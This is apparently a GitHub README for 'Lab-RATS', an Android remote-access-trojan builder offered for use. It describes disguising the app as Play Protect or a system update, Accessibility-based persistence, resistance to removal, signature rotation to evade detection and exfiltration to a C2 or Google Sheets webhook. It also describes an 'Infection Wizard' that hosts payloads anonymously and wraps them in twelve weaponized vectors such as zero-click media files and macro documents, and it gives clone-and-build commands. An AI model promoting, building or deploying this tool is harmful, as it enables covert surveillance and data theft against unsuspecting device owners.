# 🔥 Lab-RATS APK-Builder Tool

<img width="709" height="762" alt="Screenshot 2026-10-25 at 2 12 25 AM" src="https://github.com/user-attachments/assets/925a35b2-2719-42b2-918f-955b778c6d31" />

---

<img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white"> <img src="https://img.shields.io/badge/Gradle-8.10.2-C0181?style=for-the-badge&logo=gradle&logoColor=white">
<img src="https://img.shields.io/badge/Android-SDK_34-white?style=for-the-badge&logo=android&logoColor=white"> <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
<img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=airplayvideo&logoColor=white"> <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
<img src="https://img.shields.io/badge/Network-Direct_IPv6-darkred?style=for-the-badge&logo=p2p&logoColor=white"> <img src="https://img.shields.io/badge/Mode-Stealth_FUD-orange?style=for-the-badge&logo=ghost&logoColor=white">

---

## 👨‍💻 Developer: K4N3CO
- 🔗 GitHub: [github.com/K4N3CO](https://github.com/K4N3CO)

---

## ✨ Features (v1.6.0 Hardened)

| Feature                       | Description                                         |
| ----------------------------- | --------------------------------------------------- |
| 🛡️ **Dynamic Camouflage**      | Switch between 5 system-grade masquerade identities |
| 🕵️ **Ghost Watchdog**          | High-privilege persistence via Accessibility Service |
| 🔒 **Anti-Removal Shield**    | Protects against uninstallation and data clearing   |
| 🖥️ **Cross-Platform**         | Native Windows (.bat/.ps1), Linux, macOS support    |
| ☕ **Auto Java Setup**        | Checks and helps install Java JDK 17/21             |
| 🔐 **Unique Signing**         | Generates custom keystores to evade static analysis |
| 📝 **App Renaming**           | Full control over the visible application name      |
| 🌐 **Webhook Integration**    | Instant exfiltration to Google Sheets / C2          |
| 📦 **Infection Wizard**       | Automate Build -> Host -> Weaponize in one flow     |
| 💉 **Smali Surgery & Binder** | Decompile clean target APKs & inject Lab-RATS hooks |

---

## 🚀 Quick Start

### Windows

**PowerShell**
```powershell
git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git
cd Lab-RATS-v1.6/apk-builder
.\build.ps1
```

**Command Prompt**
```cmd
git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git
cd Lab-RATS-v1.6/apk-builder
build.bat
```

### Linux / macOS
```bash
git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git
cd Lab-RATS-v1.6/apk-builder
chmod +x build.sh
./build.sh
```

---

## APK-Builder Example Video Clip *(Macbook Air M2)*

https://github.com/user-attachments/assets/891459a2-4769-4dd3-8679-f586eca81efc

---

## 📋 Requirements

### Required:

| Tool         | Version      | How to Get                           |
| ------------ | ------------ | ------------------------------------ |
| **Java JDK** | 17 or 21     | Builder auto-installs or shows guide |

### Optional: *(for standalone vector generation)*

| Tool            | Platform | Install                        |
| --------------- | -------- | ------------------------------ |
| **ImageMagick** | Linux    | `sudo apt install imagemagick` |
| **ImageMagick** | macOS    | `brew install imagemagick`     |

---

## 🛠️ Build Options

### 1. Start Build *(Configure & Build)*
Complete guided setup:
- **Keystore**: Unique signing certificate generation.
- **Identity**: Select initial masquerade *(Update, Calc, Weather, Settings, or Logo)*.
- **Branding**: Set App Name (e.g., "System Stability Service").
- **ID**: Set Package Name (Application ID).
- **C2**: Configure Webhook URL for data reporting.

### 2. Generate Keystore Only
Creates a unique Android signing certificate. Essential for rotating signatures between campaigns.

### 3. Configure App Settings Only
Quickly update the App Name, Package ID, Version, or Webhook URL without regenerating keys.

### 4. Check Requirements
Verifies your environment's Java/JDK setup and provides installation guides if tools are missing.

### 5. Weaponized Payload Lab
Generate standalone tactical vectors without building the main APK. Includes 12 specialized exploit delivery methods for multi-stage infection chains.

### 6. Infection Wizard (The Power Tool)
**The ultimate automated deployment flow**:
1. **Build**: Generates the hardened APK.
2. **Host**: Select hosting strategy *(Anonymous Multi-Cloud, Direct IPv6 Link, or Custom URL)*.
3. **Shorten**: Generates a clean `is.gd` delivery URL (if cloud hosted).
4. **Weaponize**: Creates a delivery vehicle from a library of 12 tactical vectors.

---

## ☁️ Hosting Strategies

**The Infection Wizard automates payload delivery through three primary methods**:

- **Anonymous Cloud (Multi-Cloud Fallback)**: Automatically attempts upload to **Catbox.moe**. If blocked or down, automatically falls back to **Litterbox** and **Tmpfiles.org**, or prompts for a manual URL input so deployment is never blocked.
- **Direct IP (IPv6)**: Generates a direct download link using the device's current IPv6 address and the C2 port. Best for targeted, proximity-based attacks or private network execution.
- **Custom / Pre-hosted Direct URL**: Enter any pre-hosted direct download URL (e.g. self-hosted server, Dropbox, Google Drive, or S3 bucket) directly into the wizard.

---

## ☕ Java Installation

### Automatic Setup
**The builder attempts to detect and install Java automatically on most systems**. 

| Platform          | Detection Method                      |
| ----------------- | ------------------------------------- |
| **Windows**       | winget → Chocolatey → Manual link     |
| **macOS**         | Homebrew                              |
| **Linux**         | apt / dnf / pacman                    |

---

### ☕ Manual Java Installation *(Mandatory: JDK 17 or 21)*

**If the builder cannot find Java, please install it manually**:

**Windows (PowerShell)**
```powershell
# Option 1: winget (Windows 11)
winget install EclipseAdoptium.Temurin.17.JDK

# Option 2: Chocolatey
choco install temurin17

# Option 3: Scoop
scoop bucket add java
scoop install temurin17-jdk
```

**macOS**
```bash
# Homebrew
brew install openjdk@17
echo 'export PATH="/usr/local/opt/openjdk@17/bin:$PATH"' >> ~/.zshrc
```

**Linux (Ubuntu/Debian)**
```bash
sudo apt update && sudo apt install openjdk-17-jdk
```

**Fedora/RHEL**
```bash
sudo dnf install java-17-openjdk-devel
```

**Arch Linux**
```bash
sudo pacman -S jdk17-openjdk
```

---

## 🎭 Masquerade Identities

**The app icon and name transform immediately after installation on the target device based on your selection. The base installation uses the `default_app_icon_robot.png`.**

| Option | Masquerade Identity | Icon Style | Target UI |
| :--- | :--- | :--- | :--- |
| **1** | **Play Protect** | Security Shield | Play Protect Security Scan UI (Default) |
| **2** | **Calculator** | Apple Modern | Functional numeric keypad |
| **3** | **Weather** | Blue Sky Forecast | Dynamic city-based weather |
| **4** | **System Update** | Grey Status Gear | High-fidelity update wizard |
| **5** | **Lab-RATS Logo** | Unmasked | Opens main dashboard directly |

---

## 💉 Weaponization Vectors

**The builder supports 12 tactical delivery methods across the Lab and Wizard**:

1. **Zero-Click MP4**: Utilizes media parser heap overflows for background execution.
2. **Stealth PDF**: Document-based URI trigger for auto-download/install.
3. **Meeting Invite (ICS)**: Calendar injection that bypasses browser security prompts.
4. **Dolby Audio**: High-frequency acoustic triggers for buffer overflow.
5. **ADB Script**: Automated shell script for rapid deployment over debug links.
6. **Bluetooth Push**: Targeted vCard (VCF) push for OBEX-enabled devices.
7. **NFC NDEF Tag**: Binary NDEF records for physical tag programming.
8. **Stego Image**: Payload concealed within pixel slack space to bypass DPI.
9. **PWA Bundle**: Progressive Web App masquerade for "one-tap" installation.
10. **Office Word**: Macro-based document delivery for enterprise targets.
11. **Office Excel**: Calculation-triggered remote template injection.
12. **Ghost GIF (Zero-Click)**: Metadata-based MediaScanner trigger.

---

## 🔐 Persistence Layers (v1.6.0)

**The "Hardened" build includes multi-layer persistence**:

1. **Accessibility Watchdog**: Uses high-survival service status to reanimate the core if killed.
2. **WakeLock Sync**: Maintains CPU activity during network reporting in deep sleep.
3. **Static Wakers**: Resumes operation on power change, user interaction, or boot.
4. **Exponential Respawn**: Intelligent re-start logic with backoff to prevent OS flags.

---

## 📊 Google Sheet Integration

**To exfiltrate data to Google Sheets, follow these setup steps**:

1. **Create Sheet**: Go to [sheets.google.com](https://sheets.google.com) and create a new blank sheet.
2. **Add Script**: Go to `Extensions` -> `Apps Script` and paste the `webhook.gs` code (found in the main project folder).
3. **Deploy**: Click `Deploy` -> `New Deployment` -> `Web App`. Set Access to `Anyone`.
4. **Copy URL**: Copy the Web App URL and paste it into the APK Builder when prompted.

---

## 📂 Output

Built **payloads are saved to**:
```
/Lab-RATS-v1.6/apk-builder/output/
```

### Naming Format:
- `{AppName}-v{Version}-signed.apk`
- `exploit.*` *(The weaponized delivery vehicle)*

---

## 🛠️ Troubleshooting

### "Java not found" or "JDK missing"
- Ensure you have the **JDK** installed, not just the JRE.
- Run **Option 4** to see the manual installation guide.
- Check if `java -version` works in your terminal. If not, add the JDK `bin` folder to your System Environment PATH.

### "keytool not found"
- Ensure **JDK** (not JRE) is installed.
- Add JDK bin to your PATH.

### "BUILD FAILED" or Gradle Errors
- **Connection**: Ensure you have an active internet connection (Gradle needs to download dependencies on first run).
- **Cleanup**: Try running `./gradlew clean` in the project root to clear stale artifacts.
- **Licenses**: Ensure you have accepted the Android SDK licenses.

### "APK Not Signed"
- Run the **Full Build (Option 1)** first to ensure a valid `lab-rats-keystore.jks` is generated in the project root.

### Logo not changing
- The app uses `default_app_icon_robot.png` for installation and transforms into the decoy *after* the first launch. 
- Try clearing Gradle cache: `./gradlew clean`.

---

<p align="center">
  <b><img src="https://img.shields.io/badge/Developed By-K4N3CO ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
</b><br>

<p align="center"> 
<b><img src="https://img.shields.io/badge/The ones who MIND don't matter-The ones who MATTER don't mind-cyan?style=for-the-badge&logo=maserati &logoColor=white">
